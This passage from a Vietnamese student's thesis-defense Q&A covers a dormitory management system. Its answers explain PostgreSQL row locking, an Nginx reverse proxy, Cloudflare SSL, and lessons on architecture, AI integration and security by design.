Em sử dụng cơ chế Khóa bi quan (Pessimistic Locking) trực tiếp trong các giao dịch SQL của PostgreSQL (Database Transaction):
Khi thuật toán xếp phòng truy vấn giường trống, câu lệnh SQL sẽ được bổ sung mệnh đề `FOR UPDATE`, ví dụ:
`SELECT id, current_usage, capacity FROM rooms WHERE id = $1 FOR UPDATE;`
Ý nghĩa: Khi một giao dịch đang đọc thông tin phòng o này để xếp chỗ, PostgreSQL sẽ lập tức khóa dòng dữ liệu đó lại. Bất kỳ giao dịch phê duyệt nào khác của Admin khác muốn truy cập dòng này đều phải xếp hàng chờ cho đến khi giao dịch đầu tiên hoàn tất (Commit hoặc Rollback).
Sau khi đọc được chỉ số an toàn, hệ thống cập nhật chỉ số giường và Commit giao dịch. Giao dịch tiếp theo vào sau sẽ thấy phòng đã hết giường trống và tự động chuyển hướng xếp sinh viên sang phòng khác, loại bỏ hoàn toàn lỗi tranh chấp dữ liệu.

### Câu hỏi 48: Tại sao em lại cấu hình Nginx làm Reverse Proxy khi deploy hệ thống lên kytucxatlu.site? Nó mang lại lợi ích gì về bảo mật và hiệu năng?
Trả lời của sinh viên:
Việc cấu hình Nginx làm Reverse Proxy khi deploy mang lại ba lợi ích kỹ thuật quan trọng cho hệ thống:
Một là ẩn thông tin Backend để bảo mật: Client hoàn toàn không giao tiếp trực tiếp với cổng `1234` của NodeJS Backend. Nginx đứng ở cổng `80/443` nhận mọi yêu cầu và điều hướng ngầm về Backend. Điều này giúp ngăn chặn kẻ tấn công khai thác trực tiếp các lỗ hổng bảo mật nếu có của NodeJS server.
Hai là tối ưu hóa phục vụ tệp tĩnh (Static File Serving): Frontend React sau khi build thành các file HTML/JS/CSS tĩnh được Nginx phục vụ trực tiếp. Nginx xử lý tệp tĩnh cực kỳ nhanh và tốn ít RAM hơn rất nhiều so với việc bắt NodeJS Backend phải gánh cả nhiệm vụ gửi file tĩnh cho Client.
Ba là mã hóa bảo mật SSL/TLS tập trung: Nginx đảm nhận việc giải mã HTTPS và quản lý chứng chỉ SSL, giúp giảm tải công việc tính toán mã hóa cho NodeJS Backend, để Backend tập trung tối đa hiệu năng xử lý logic nghiệp vụ.

### Câu hỏi 49: Việc sử dụng Cloudflare SSL trong quá trình deploy giúp giải quyết bài toán gì cho hệ thống?
Trả lời của sinh viên:
Sử dụng Cloudflare SSL mang lại ba giá trị bảo mật và hiệu năng thực tế cho kytucxatlu.site:
1. Bảo mật HTTPS miễn phí và tự động gia hạn: Cloudflare cung cấp chứng chỉ SSL mã hóa toàn vẹn dữ liệu truyền tải giữa trình duyệt sinh viên và máy chủ, ngăn chặn tấn công nghe trộm thông tin (Man-in-the-middle).
2. Ẩn địa chỉ IP gốc của máy chủ (IP Masking): Cloudflare hoạt động như một lớp CDN đệm ở giữa, kẻ tấn công chỉ nhìn thấy địa chỉ IP của Cloudflare chứ không biết IP thật của máy chủ của em, giúp chống lại các cuộc tấn công DDoS trực tiếp vào máy chủ.
3. Tăng tốc độ tải trang (Caching & Minification): Cloudflare tự động lưu bản sao các tệp tĩnh (CSS, JS, hình ảnh) trên các máy chủ edge gần người dùng nhất và tự động nén dung lượng mã nguồn, giúp sinh viên truy cập hệ thống nhanh hơn.

### Câu hỏi 50: Sau khi hoàn thành đồ án này, em rút ra được những kinh nghiệm thực tiễn nào lớn nhất về phát triển hệ thống thông tin quy mô lớn và ứng dụng Trí tuệ nhân tạo (AI)?
Trả lời của sinh viên:
Qua quá trình thực hiện đồ án tốt nghiệp, em đã tích lũy được ba bài học thực tiễn vô cùng quý giá:
Bài học 1: Tầm quan trọng của việc tách biệt kiến trúc và chuẩn hóa dữ liệu. Việc phân tách rõ ràng Frontend-Backend và áp dụng mô hình 3 tầng (Controller-Service-DAO) giúp em kiểm soát được độ phức tạp của code khi hệ thống phình to lên, dễ dàng debug và sửa lỗi mà không làm ảnh hưởng đến các module khác.
Bài học 2: AI phải phục vụ nghiệp vụ thực tế chứ không phải để biểu diễn công nghệ. Việc em tích hợp OCR, NLP hay Chatbot chỉ thực sự có giá trị khi nó được kết nối chặt chẽ vào database và giải quyết đúng các điểm nghẽn thực tiễn như xác thực thẻ nghèo hay phân loại cảm xúc phản hồi để BQL xử lý nhanh hơn.
Bài học 3: Bảo mật hệ thống phải được thiết kế ngay từ đầu (Security by Design) chứ không phải đợi đến khi deploy mới làm. Việc băm mật khẩu, phân quyền JWT, chống SQL Injection bằng Parameterized Query cần được viết cẩn thận trong từng dòng code ngay từ ngày đầu tiên xây dựng dự án.
